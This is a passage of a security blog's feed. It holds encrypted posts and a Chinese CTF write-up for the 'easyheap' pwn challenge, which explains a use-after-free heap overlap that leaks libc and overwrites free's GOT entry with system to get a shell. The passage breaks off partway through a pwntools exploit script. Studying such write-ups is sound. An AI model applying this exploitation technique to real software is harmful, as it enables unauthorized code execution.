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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span 